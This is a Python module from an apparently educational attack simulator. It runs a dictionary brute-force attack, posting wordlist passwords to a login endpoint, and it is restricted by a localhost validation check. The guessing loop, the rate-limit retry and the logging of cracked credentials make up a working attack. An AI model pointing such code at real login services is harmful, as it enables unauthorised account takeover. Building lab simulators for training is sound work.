"""
CyberSim6 - Dictionary Attack Module
Brute force attack using a wordlist against a local auth server.
"""

import time
from pathlib import Path

import requests as http_requests

from cybersim.core.base_module import BaseModule
from cybersim.core.safety import validate_url_localhost


class DictionaryAttack(BaseModule):
    """Dictionary-based brute force attack simulation."""

    MODULE_TYPE = "attack"
    MODULE_NAME = "bruteforce_dictionary"

    def _validate_safety(self):
        url = self.config.get("target_url", "http://127.0.0.1:9090/login")
        validate_url_localhost(url)

    def run(self, target_url: str = None, username: str = None,
            wordlist: str = None, max_attempts: int = None,
            delay_ms: int = None, **kwargs):
        """
        Launch dictionary attack.

        Args:
            target_url: Login URL (must be localhost)
            username: Username to attack
            wordlist: Path to wordlist file
            max_attempts: Max number of attempts
            delay_ms: Delay between attempts in milliseconds
        """
        target_url = target_url or self.config.get("target_url", "http://127.0.0.1:9090/login")
        username = username or self.config.get("username", "admin")
        wordlist_path = Path(wordlist or self.config.get("wordlist", "./cybersim/bruteforce/wordlists/common.txt"))
        max_attempts = max_attempts or self.config.get("max_attempts", 1000)
        delay_ms = delay_ms or self.config.get("delay_ms", 50)

        validate_url_localhost(target_url)

        if not wordlist_path.exists():
            self.log_event("error", {
                "message": f"Wordlist not found: {wordlist_path}",
                "status": "error",
            })
            return None

        # Load wordlist
        passwords = wordlist_path.read_text(encoding="utf-8").strip().splitlines()
        total = min(len(passwords), max_attempts)

        self._running = True
        self.log_event("attack_started", {
            "message": f"Dictionary attack started on '{username}' -> {target_url} ({total} passwords)",
            "target": target_url,
            "username": username,
            "wordlist_size": total,
            "status": "warning",
        })

        delay = delay_ms / 1000.0
        found_password = None

        for i, password in enumerate(passwords[:max_attempts]):
            if not self._running:
                break

            password = password.strip()
            if not password:
                continue

            try:
                resp = http_requests.post(
                    target_url,
                    data={"username": username, "password": password},
                    timeout=5,
                )

                if resp.status_code == 200:
                    found_password = password
                    self.log_event("credential_found", {
                        "message": f"PASSWORD FOUND for '{username}': '{password}' (attempt #{i+1})",
                        "username": username,
                        "password": password,
                        "attempt_number": i + 1,
                        "status": "warning",
                    })
                    break
                elif resp.status_code == 429:
                    self.log_event("rate_limited", {
                        "message": f"Rate limited at attempt #{i+1}. Waiting...",
                        "attempt_number": i + 1,
                        "status": "warning",
                    })
                    time.sleep(5)
                    continue

            except http_requests.RequestException as e:
                self.log_event("error", {
                    "message": f"Request error at attempt #{i+1}: {e}",
                    "status": "error",
                })

            if (i + 1) % 50 == 0:
                self.log_event("progress", {
                    "message": f"Tried {i+1}/{total} passwords...",
                    "attempts": i + 1,
                    "status": "info",
                })

            if delay > 0:
                time.sleep(delay)

        self._running = False
        if found_password:
            self.log_event("attack_completed", {
                "message": f"Attack successful! Password for '{username}': '{found_password}'",
                "status": "info",
            })
        else:
            self.log_event("attack_completed", {
                "message": f"Attack completed. Password not found in wordlist.",
                "status": "info",
            })

        return found_password

    def stop(self):
        self._running = False
        self.log_event("attack_stopped", {
            "message": "Dictionary attack stopped by user.",
            "status": "info",
        })
